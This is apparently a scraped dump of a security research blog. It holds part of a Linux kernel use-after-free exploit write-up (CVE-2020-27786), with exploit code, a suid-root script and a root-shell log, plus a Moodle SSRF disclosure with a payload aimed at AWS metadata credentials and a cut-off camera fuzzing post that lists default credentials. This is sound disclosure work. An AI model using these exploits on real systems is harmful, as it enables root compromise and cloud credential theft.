reference counter on the targeted vulnerable buffer. In order to understand where the vulnerbility lived it's a good thing to see its patch:\n```diff\ndiff --git a/include/sound/rawmidi.h b/include/sound/rawmidi.h\nindex 5432111c8761..2a87128b3075 100644\n--- a/include/sound/rawmidi.h\n+++ b/include/sound/rawmidi.h\n@@ -76,6 +76,7 @@ struct snd_rawmidi_runtime {\n        size_t avail_min;       /* min avail for wakeup */\n        size_t avail;           /* max used buffer for wakeup */\n        size_t xruns;           /* over/underruns counter */\n+       int buffer_ref;         /* buffer reference count */\n        /* misc */\n        spinlock_t lock;\n        wait_queue_head_t sleep;\ndiff --git a/sound/core/rawmidi.c b/sound/core/rawmidi.c\nindex 358b6efbd6aa..481c1ad1db57 100644\n--- a/sound/core/rawmidi.c\n+++ b/sound/core/rawmidi.c\n@@ -108,6 +108,17 @@ static void snd_rawmidi_input_event_work(struct work_struct *work)\n                runtime-\u003eevent(runtime-\u003esubstream);\n }\n \n+/* buffer refcount management: call with runtime-\u003elock held */\n+static inline void snd_rawmidi_buffer_ref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref++;\n+}\n+\n+static inline void snd_rawmidi_buffer_unref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref--;\n+}\n+\n static int snd_rawmidi_runtime_create(struct snd_rawmidi_substream *substream)\n {\n        struct snd_rawmidi_runtime *runtime;\n@@ -654,6 +665,11 @@ int snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n                if (!newbuf)\n                        return -ENOMEM;\n                spin_lock_irq(\u0026runtime-\u003elock);\n+               if (runtime-\u003ebuffer_ref) {\n+                       spin_unlock_irq(\u0026runtime-\u003elock);\n+                       kfree(newbuf);\n+                       return -EBUSY;\n+               }\n                oldbuf = runtime-\u003ebuffer;\n                runtime-\u003ebuffer = newbuf;\n                runtime-\u003ebuffer_size = params-\u003ebuffer_size;\n@@ -962,8 +978,10 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n        long result = 0, count1;\n        struct snd_rawmidi_runtime *runtime = substream-\u003eruntime;\n        unsigned long appl_ptr;\n+       int err = 0;\n \n        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -982,16 +1000,19 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n                if (userbuf) {\n                        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n                        if (copy_to_user(userbuf + result,\n-                                        runtime-\u003ebuffer + appl_ptr, count1)) {\n-                               return result \u003e 0 ? result : -EFAULT;\n-                       }\n+                                        runtime-\u003ebuffer + appl_ptr, count1))\n+                               err = -EFAULT;\n                        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+                       if (err)\n+                               goto out;\n                }\n                result += count1;\n                count -= count1;\n        }\n+ out:\n+       snd_rawmidi_buffer_unref(runtime);\n        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n-       return result;\n+       return result \u003e 0 ? result : err;\n }\n \n long snd_rawmidi_kernel_read(struct snd_rawmidi_substream *substream,\n@@ -1262,6 +1283,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n                        return -EAGAIN;\n                }\n        }\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail \u003e 0) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -1293,6 +1315,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n        }\n       __end:\n        count1 = runtime-\u003eavail \u003c runtime-\u003ebuffer_size;\n+       snd_rawmidi_buffer_unref(runtime);\n\n```\n\nTwo functions were added: [snd_rawmidi_buffer_ref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L112) and [snd_rawmidi_buffer_unref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L117). They are respectively used to take and remove a reference to the buffer using `snd_rawmidi_runtime-\u003ebuffer_ref` when it is copying ([snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957)) or writing ([snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242)) into that buffer. But why this was needed? Because read and write operations handled by [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) and [snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957) temporarly unlock the runtime lock during the copying from/to userspace using `spin_unlock_irqrestore`[1]/`spin_lock_irqrestore`[2] giving a small race window where the object can be modified during the `copy_from_user` call:\n```C\nstatic long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream, const unsigned char __user *userbuf, const unsigned char *kernelbuf, long count) {\n\t// [..]\n\t\t\tspin_unlock_irqrestore(\u0026runtime-\u003elock, flags); // [1]\n\t\t\tif (copy_from_user(runtime-\u003ebuffer + appl_ptr,\n\t\t\t\t\t   userbuf + result, count1)) {\n\t\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags);\n\t\t\t\tresult = result \u003e 0 ? result : -EFAULT;\n\t\t\t\tgoto __end;\n\t\t\t}\n\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags); // [2]\n\t// [..]\n\n}\n```\n\nIf a concurrent thread re-allocate the `runtime-\u003ebuffer` using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl, that thread can lock the object from `spin_lock_irq` [1] (that has been left unlocked in the small race window given by `snd_rawmidi_kernel_write1`) and free that buffer[2], making possible to re-allocate an arbitrary object and write on that. Also, the `kmalloc`[3] in `snd_rawmidi_output_params` is called with `params-\u003ebuffer_size` that is totally user controllable.\n\n```C\nint `snd_rawmidi_output_params`(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..]\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); // [3]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock); // [1]\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf;\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); // [3]\n\t}\n\t// [..]\n}\n```\n\nWhat happen if, while a thread is writing into the buffer with `copy_from_user`, another thread frees that buffer using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl and reallocates a new arbitrary one? The object is replaced with an new one and the `copy_from_user` will continue writing into another object (the \"victim object\") corrupting its values =\u003e User-After-Free (Write).\n\nThe really good part about this vulnerability is the \"freedom\" you can have:\n- It's possible to call `kmalloc` with an arbitrary size (and this will be the freed object that we are going to replace to cause a UAF) which means that we can target our favourite slab cache (based on what we need, ofc)\n- We can write as much as we want in the buffer with the `write` syscall\n\n## Extend the Race Time Window\nWe know we have a small race window with few instructions while copying data from userland to kernel as explained before, but the great news is that we have a `copy_from_user` that can be suspended arbitrarly handling page fault in user-space ! Since I was exploiting the vulnerability in a 4.9 kernel (4.9.223) and hence userfaultd is still not unprivileged as in \u003e5.11, we can still use it to extend our race window and have the necessary time to re-allocate a buffer!\n\n## Exploitation Plan\nWe stated that we are going to use the userfaultd technique to extend the time window. If you are new to this technique is well explained [here](https://lwn.net/Articles/819834/), in this [video](https://www.youtube.com/watch?v=6dFmH_JEF4s) (you can use substitles) and [here](https://blog.lizzie.io/using-userfaultfd.html). To summarize: you can handle page faults from user-land, temporarly blocking kernel execution while handling the page fault. If we `mmap` a block of memory with `MAP_ANONYMOUS` flag, the memory will be demand-zero paged, meaning that it's not yet allocated and we can allocate it via userfaultd.\nThe idea using this technique is:\n- Initialize the `runtime-\u003ebuffer` with `open` =\u003e This will allocate the buffer with 4096 size (that will land in `kmalloc-4096`)\n- Send `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl command in order to re-allocate the buffer with our desired size (e.g. 30 wil land in `kmalloc-32`)\n- Allocate with `mmap` a demand-zero paged (`MAP_ANON`) and initialize `userfaultd` to handle its page fault\n- `write` to the rawmidi file descriptor using our previously allocated mmaped memory =\u003e This will trigger the userland page fault in `copy_from_user`\n- While the kernel thread is suspended waiting for the userland page fault we can send again the `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to free the current `runtime-\u003ebuffer`\n- We allocate an object in, for example, `kmalloc-32` and if we did some spray before on that cache it will take the place of the previous freed `runtime-\u003ebuffer`\n- We release the page fault from userland and the `copy_from_user` will continue writing its data (totally in user control) to the new allocated object\n\nWith this primitive, we can forges arbitrary objects with **arbitrary size** (specified in the `write` syscall), **arbitrary content**, **arbitrary offset** (since we can trigger userfaultd between two pages as demostrated later on) and **arbitrary cache** (we can control the size allocation in the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl).\nAs you can deduce, we have a really great and powerful primitive !\n\n## Information Leak\n### Victim Object\nWe are going to use what we previously explained in the \"Exploitation Plan\" section to leak an address that we will re-use to have an arbitrary write. Since we can choose which cache trigger the UAF on (and that's gold from an exploitation point of view) I choose to leak the `shm_file_data-\u003ens` pointer that points to `init_ipc_ns` in the kernel `.data` section and it lives in `kmalloc-32` (I also used the same function to spray the `kmalloc-32` cache):\n\n```C\nvoid alloc_shm(int i)\n{\n\tint shmid[0x100]     = {0};\n\tvoid *shmaddr[0x100] = {0};\n    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);\n    if (shmid[i]  \u003c 0) errExit(\"shmget\");\n    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);\n    if (shmaddr[i] \u003c 0) errExit(\"shmat\");\n}\nalloc_shm(1)\n```\n\nFrom that pointer, we will deduce the pointer of `modprobe_path` in order to use that technique later to elevate our privileges.\n\n### msg_msg\n```C\nstruct msg_msg {\n\tstruct list_head m_list;\n\tlong m_type;\n\tsize_t m_ts;\t\t/* message text size */\n\tstruct msg_msgseg *next;\n\tvoid *security;\n\t/* the actual message follows immediately */\n};\n\nstruct msg_msgseg {\n\tstruct msg_msgseg *next;\n\t/* the next part of the message follows immediately */\n};\n\n```\nIn order to leak that address, however, we have to compromise some other object in `kmalloc-32`, maybe a length field that would read after its own object. For that case, `msg_msg` is our perfect match because it has a length field specified in its `msg_msg-\u003em_ts` and it can be allocated in almost any cache starting from `kmalloc-32` to `kmalloc-4096`, with just one downside: The minimun allocation for the `msg_msg` struct is 48 (`sizeof(struct msg_msg)`) and it can lands minimun at `kmalloc-64`.\nIf you want to read more about this structure you can checkout [Fire of Salvation Writeup](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html), [Wall Of Perdition](https://syst3mfailure.io/wall-of-perdition) and the [kernel source code](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msg.c).\nHowever, when a message is sent using `msgsnd` with size more than [DATALEN_MSG](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msgutil.c#L46) (`((size_t)PAGE_SIZE-sizeof(struct msg_msg))`) that is 4096-48, a segment (or multiple segments if needed) is allocated, and the message is splitted between the `msg_msg` (the payload is just after the struct headers) and the `msg_msgseg`, with the total size of the message specified in `msg_msg-\u003em_ts`. \n\nIn order to allocate our target object in `kmalloc-32` we have to send a message with size: ( ( 4096 - 48 ) + 10 ).\n- The `msg_msg` structure will be allocated in `kmalloc-4096` and the first (4096 - 48) bytes will be written in the `msg_msg` structure.\n- To allocate the remaining 10 bytes, a segment `msg_msgseg` will be allocated in `kmalloc-32`\n\nWith these conditions, we can forge the `msg_msg` structure in `kmalloc-4096` overwriting its `m_ts` value with our UAF and with `msgrcv` we can receive a message that will contains values past our segment allocated in `kmalloc-32` (including our targeted `init_ipc_ns` pointer).\n\n#### Dealing with offsets\nHowever, we want to overwrite the `m_ts` value without overwriting anything else in the `msg_msg` structure, how we can do that?\nIf you remember, I said we can overwrite chunks with arbitrary size, content and **offset**. If we create a `mmap` memory with size `PAGE_SIZE * 2` (two pages) and we handle the page fault only for the second page, we can start writing into the original `runtime-\u003ebuffer` and trigger the page fault when it receives the `msg_msg-\u003em_ts` offset (0x18). Now that the kernel thread is blocked, it's possible to replace the object with `msg_msg` and when the `copy_from_user` resumes, it will starts writing exactly at the `msg_msg-\u003em_ts` value the remaining bytes. The size we are writing into the file descriptor is (0x18 + 0x2) since the first 0x18 bytes will be used to land at the exact offset and the 2 remaining bytes will write `0xffff` in `msg_msg-\u003em_ts`. The concept is also explained in the following picture:\n\n![[notes/images/2.png]]\n\nNow from the received message from `msgrcv` we can retrieve the `init_ipc_ns` pointer from `shm_file_data` and we can deduce the `modprobe_path` address calculating its offset and proceed with the arbitrary write phase.\n\n## Arbitrary Write\nIn order to write at arbitrary locations we are using the same userfault technique described above but instead of targeting `msg_msg` we will use the Vectored I/O (`pipe` + `iovec`) primitive. This primitive has been fixed in kernel 4.13 with [copyin](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L142) and [copyout](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L133) wrappers, with an `access_ok` addition. This technique has been widely used exploiting the Android Binder CVE-2019-2215 and is well detailed [here](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html) and [here](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer).\n\nThe idea is to trigger the UAF once again but targeting the [iovec](https://elixir.bootlin.com/linux/v4.9.223/source/include/uapi/linux/uio.h#L16) struct:\n\n```C\nstruct iovec\n{\n\tvoid __user *iov_base;\t/* BSD uses caddr_t (1003.1g requires void *) */\n\t__kernel_size_t iov_len; /* Must be size_t (1003.1g) */\n};\n```\n\nThe [minimun allocation](https://elixir.bootlin.com/linux/v4.9.223/source/fs/read_write.c#L792) for `iovec` occurs with `sizeof(struct iovec) * 9` or `16 * 9` (144) that will land at `kmalloc-192` (otherwise it is stored in the stack). However I choose to allocate 13 vectors using `readv` to make the object land in `kmalloc-256`.\n```C\n    int pipefd[2];\n    pipe(pipefd)\n    // [...]\n    struct iovec iov_read_buffers[13] = {0};\n    char read_buffer0[0x100];\n    memset(read_buffer0, 0x52, 0x100);\n    iov_read_buffers[0].iov_base = read_buffer0;\n    iov_read_buffers[0].iov_len= 0x10;\n    iov_read_buffers[1].iov_base = read_buffer0;\n    iov_read_buffers[1].iov_len= 0x10;\n    iov_read_buffers[8].iov_base = read_buffer0;\n    iov_read_buffers[8].iov_len= 0x10;\n    iov_read_buffers[12].iov_base = read_buffer0;\n    iov_read_buffers[12].iov_len= 0x10;\n\n    if(!fork()){\n        ssize_t readv_res = readv(pipefd[0], iov_read_buffers, 13); // 13 * 16 = 208 =\u003e kmalloc-256\n        exit(0);\n    }\n```\n\nThe `readv` is a blocking call that **stays** (does not free) the object in the kernel so that we can corrupt it using our UAF and re-use it later with our arbitrary modified content. If we corrupt the `iov_base` of an `iovec` structure we can write at arbitrary kernel addresses with a `write` syscall since it is uses the unsafe [\\_\\_copy_from_user](https://elixir.bootlin.com/linux/v4.9.223/source/lib/iov_iter.c#L267) (same as `copy_from_user` but without checks).\n\n![[notes/images/3.png]]\n\nOur idea is:\n- Resize the `runtime-\u003ebuffer` with `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to lands into`kmalloc-256` with a size greater than 192\n- `write` into the file descriptor specifycing a demanded-zero paged memory (`MAP_ANON`) so that `copy_from_user` will stop its execution waiting for our user-land page fault handler\n- While the kernel thread is waiting, free the buffer using again the re-size ioctl command `SNDRV_RAWMIDI_IOCTL_PARAMS`\n- Allocate the `iovec` struct using `readv` that will replace the previously allocated `runtime-\u003ebuffer`\n- Resume the kernel execution releasing the page fault handler. Now the `copy_from_user` will start to write into the `iovec` structure and we will overwrite `iov[1].iov_base` with the `modprobe_path` address.\n\nNow, in order to overwrite the `modprobe_path` value we just have to write our arbitrary content using the `write` syscall into `pipe[0]`. In the released exploit I overwrote the second iov entry (`iov[1]`) using the same technique described before with adjacent pages. However, it's also possible to directly overwrite the first `iov[0].iov_base`.\n\nNice ! Now we have overwritten `modprobe_path` with `/tmp/x` and .. it's time to pop a shell !\n\n### modprobe_path \u0026 uid=0\nIf you are not familiar with `modprobe_path` I suggest you to check out [Exploiting timerfd_ctx Objects In The Linux Kernel](https://syst3mfailure.io/hotrod) and the [man page](https://man7.org/linux/man-pages/man2/userfaultfd.2.html).\nTo summarize, `modprobe_path` is a global variable with a default value of `/sbin/modprobe` used by `call_usermodehelper_exec` to execute a user-space program in case a program with an unkown header is executed.\nSince we have overwritten `modprobe_path` with `/tmp/x`, when a file with an unknown header is executed, our controllable script is executed as root.\n\nThese are the exploit functions that prepares and later executes a suid shell:\n\n```C\nvoid prep_exploit(){\n    system(\"echo '#!/bin/sh' \u003e /tmp/x\");\n    system(\"echo 'touch /tmp/pwneed' \u003e\u003e /tmp/x\");\n    system(\"echo 'chown root: /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod 777 /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod u+s /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo -e '\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd' \u003e /tmp/nnn\");\n    system(\"chmod +x /tmp/x\");\n    system(\"chmod +x /tmp/nnn\");\n}\n\nvoid get_root_shell(){\n    system(\"/tmp/nnn 2\u003e/dev/null\");\n    system(\"/tmp/suid 2\u003e/dev/null\");\n}\n\nint main(){\n\tprep_exploit();\n\t// [..] exploit stuff\n\tget_root_shell(); // pop a root shell\n}\n\n```\n\nWhat the exploit does is simply create the `/tmp/x` binary that will suid as root a file dropped in `/tmp/suid` and create a file with an unknown header (`/tmp/nnn`) that will trigger the executon as root of `/tmp/x` from `call_usermodehelper_exec`. After that, the `/tmp/suid` gives root privileges and spawns a root shell.\n\nPOC:\n```bash\n/ $ uname -a                                   \nLinux (none) 4.9.223 #3 SMP Wed Jun 1 23:15:02 CEST 2022 x86_64 GNU/Linux \n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /main \n[*] Starting exploitation ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to 4096 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x5551000!\n[*] Replacing freed obj with msg_msg .\n[*] Waiting for userfaultd to finish ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[+] init_ipc_ns @0xffffffff81e8d560\n[+] calculated modprobe_path @0xffffffff81e42a00\n[+] Starting the arbitrary write phase ..\n[*] Closing and reopening re-opening rawmidi fd ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to land into kmalloc-256 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf from SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x7771000!\n[*] Waiting for readv ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[*] Writing into the pipe ..\n[*] write = 24\n[+] enjoy your r00t shell [:\n/ # id\nuid=0(root) gid=0 groups=1000\n/ #\n```\n\n## Conclusion\nThat was my journey into exploiting a known vulnerability in the `4.9.223` kernel. You can find the whole exploit on github: https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit.\n\n## References\n- https://1day.dev/2022-06/1day-devel-part-1.html\n- https://elixir.bootlin.com/linux/v4.9.223/source/\n- https://lwn.net/Articles/819834/\n- https://www.youtube.com/watch?v=6dFmH_JEF4s\n- https://blog.lizzie.io/using-userfaultfd.html\n- https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html\n- https://syst3mfailure.io/wall-of-perdition\n- https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\n- https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer\n- https://syst3mfailure.io/hotrod\n- https://man7.org/linux/man-pages/man2/userfaultfd.2.html\n- https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Moodle-Server-Side-Request-Forgery-SSRF":{"title":"Moodle Server-Side Request Forgery","content":"\nDuring the research time in Hacktive Security I found 2 Server-Side Request Forgery on Moodle. The first one is a Blind SSRF already discovered in 2018 and tracked as CVE-2018-1042 without a proper patch, the other one is a fresh SSRF while parsing image tags inside the same component (**File Picker**). \n\n**They are currently not patched and both working on the latest Moodle version** because the Moodle Team, as they said from emails, leaves the responsibility to protect network interactions to system administrators. I personally do not agree with this statement because it leaves a dangerous vulnerability in a vanilla installation that can lead critical scenarios especially on cloud based hosting. So, in order to protect your Moodle installation, check out the Workaround section at the end of the article.\n\nLet's deppen these vulnerabilities starting from the impacted component, the File Picker.\n\n## File Picker\n\nThe File picker is a core Moodle component used to handle file uploads for multiple scopes. For example, it is used in the user's profile picture handling or in 'Private Files', a dedicated area for any authenticated user. You can easily upload a file, but also retrieve an image from an **arbitrary URL(!)**.\n\nAs it is used for multiple purposes, it is by default accessible to any authenticated user (also low privilege ones).\n\n## The fresh SSRF\n\nThe vulnerability resides on image parsing from an arbitrary URL (when an user choose to retrieve an image using the URL, as mentioned before).\nIf you request an HTML page, Moodle will fetch all `\u003cimg\u003e` tags inside it and ask you to choose which image you want to download. It extracts the src attribute for all image tags in the page and directly downloads the image, without further checks. That means that if we request the image from a server we control, we can request an HTML page with an arbitrary URL inside an image tag and Moodle will perform this arbitrary request for us. Then we can save the fake image (that contains the response for the SSRF) and display its result.\n\n### POC\n\n![img1|400](/notes/images/moodle/1.png)\n\nFrom the 'URL Downloader' action inside the File Picker, we can put a URL to our server that points to /index.html, that will contains the following payload:\n\n``\n\u003cimg src=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\u003e\n``\n\nThe request will catch our `src` attribute as follow:\n\n\n![img2](/notes/images/moodle/2.png)\n\nThat will result, in the UI, in the following selection:\n\n![img3|400](/notes/images/moodle/3.png)\n\nWe can click on the box, and choose to download the fetced 'image'\n\n![img4|300](/notes/images/moodle/4.png)\n\nIn order to download the response, we have to provide a custom extension in the title name and customize the accepted_types[] parameter according to it (for example .arbitraryExtension)\n\n![img5](/notes/images/moodle/5.png)\n\nhe returned JSON response will contain the path to the result file (with the arbitrary request's response), that we can download with a GET request:\n\n![img6](/notes/images/moodle/6.png)\n\nBy automating this whole process with an exploit, we can now easily interact with local services.\n\nFor example, in a AWS EC2 instance we can interact with the Meta and User Data API internal endpoint at 169.254.169.254 (You can find more about this API at [AWS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).\n\n\n![img7](/notes/images/moodle/7.png)\n\n![img8](/notes/images/moodle/8.png)\n\n## The old Blind SSRF\nThe unpatched Blind SSRF vulnerability (CVE-2018-1042) was already described here: [exploit-db/exploits/47177](https://www.exploit-db.com/exploits/47177). The patch did not applied any fix, so it is still exploitable and more suitable for internal port scans (as it is blind):\n\n![img9|600](/notes/images/moodle/9.png)\n\nYou can find both exploits in the Reference section.\n\n## Conclusions and Workaround\nAs we said, these SSRF are actually working on the latest Moodle release and their impact can be pretty critical for cloud based instances. Moodle has an open issue that plans to restrict most common restriction scenarios [MDL-56873](https://tracker.moodle.org/browse/MDL-56873) from 2016.\n\nTo fix these issues, from 'Site Administration \u003e Security \u003e HTTP Security' it is possible to restrict allowed hosts and ports (cURL blocked hosts and cURL allowed ports). You can customize these configurations based on your environment (such as restricting the loopback, internal network and allowing only HTTP ports to avoid port scans also to external sources).\n\n## Timeline\n\n- 02/02/2020 - Moodle contacted\n- 03/02/2020 - They received the request and handle the case\n- 06/02/2020 - Blind SSRF vulnerability rejected (System Administrators should fix it)\n- 11/03/2020 - We replied to some questions\n- 25/03/2020 - Also the SSRF vulnerability is rejected (System Administrators should fix it)\n- 25/03/2020 - Tried to emphasize the risk\n- 30/03/2020 - Issues closed without a fix","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Not-All-Roads-Lead-to-PWN2OWN-CGI-Fuzzing-AFL-and-ASAN-Part-3":{"title":"Not All Roads Lead to PWN2OWN - CGI Fuzzing, AFL and ASAN (Part 3)","content":"\n## Introduction\nIn the previous parts of the series ([Part 1](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1/) and [Part 2](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Firmware-Reverse-Engineering-Part-2/)) we have targeted the Lorex IP Camera. As discussed, we put too much effort on the initial phase without doing actual vulnerability research on it. We had few days left and another target available, the Ubiquiti AI Bullet. We are going to discuss  our fuzzing approaches, bug triaging and, unfortunately, some false hopes. So, without any further ado, let's go straight into it.\n\n## Target overview\nThe Ubiquiti is a totally different target compared to the Lorex IP Camera, it targets a totally different type of consumers due to its high price of 500$. Due to the enterprise nature of the camera, it is only powered through PoE and it exposes three main services: SSH, a web service and a discovery utility. The very first interesting thing was the SSH service with default credentials discovered with some OSINT operations. These credentials, `ubnt:ubnt` and `ui:ui`, are intended for privileged console access and web service logon. The console access is an interesting point from a research point of view since it permits to firmly identify exposed network services and their binaries and have access to the camera firmware directly, also offering debugging capabilities. The camera is an ARM64 device with a pretty recent kernel version (5.4) and busybox.\n\n## Network Attack Surface\nSince the allocated time was rapidly coming to an end, we decided to focus on the network attack surface only. It is fair to appoint that this is not the only attack surface available for a camera embedded device. For example, in previous PWN2OWN edition, the Wyze Cam v3 was pwned with a command injection vulnerability ([CVE-2024-6247](https://www.zerodayinitiative.com/advisories/ZDI-24-838/)) through a QR code scanned from the camera itself. However, we had few days left and we had to optimize our choices. As previously mentioned, we have three exposed services:\n\n```bash\nUVC AI Bullet-4.64.113# netstat -atnpu\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      982/lighttpd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      982/lighttpd\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      983/dropbear\nudp        0      0 0.0.0.0:10001           0.0.0.0:*                           1086/infctld\n```\n\nWe excluded the path to find 0days in the dropbear service and, for that reason, we only had two possible targets. \n\n## The UDP infctld service\nThe UDP service binary exposed on the 10001 port is a simple and minimal binary containing only the `main` function. Its purpose is pretty simple: it parses a simple input and returns information about the camera device. It is an Ubiquiti common utility and there are a tons of open source clients that communicate with that service. For example, this is a sample output from the [ubnt-discover](https://github.com/guerrerocarlos/ubnt-discover/tree/master) tool (from the repository itself):\n\n```bash\n$ ubnt-discover\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘ Device Type â”‚ Name        â”‚ Host           â”‚ Mac               â”‚ Firmware                              â•‘\nâ•Ÿâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¢\nâ•‘ NVR         â”‚ UniFi-Video â”‚ 192.168.10.XXX â”‚ 68217XXXXX523XXXX â”‚ NVR.x86_64.v3.2.2.8ff52ec.160415.0002 â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nWaiting for more... (Ctrl+C to exit)\n```\n\nWe performed reverse engineering and black-box fuzzing with an ad-hoc written tool based on [radamsa](https://gitlab.com/akihe/radamsa) mutation. The tool was similar to the public [fuzzotron](https://github.com/denandz/fuzzotron) solution, that we have discovered at the end of the activity, with an additional mechanism to find potential crashes through `strace`.\n\n### A straight and simple network fuzzer\n![[notes/images/pwn2own-23/5.png]]\n\nThe fuzzer architecture was quickly scratched with this diagram and can be resumed with some points:\n- **Initial corpus**: first of all, we needed an initial corpus to starts the mutation process with `radamsa`. After some reverse engineering, we were able to identify that a simple payload was requested (`01 00 00 00`).\n- **Input mutation**: starting from the initial first simple packet, the python tool generates new input using 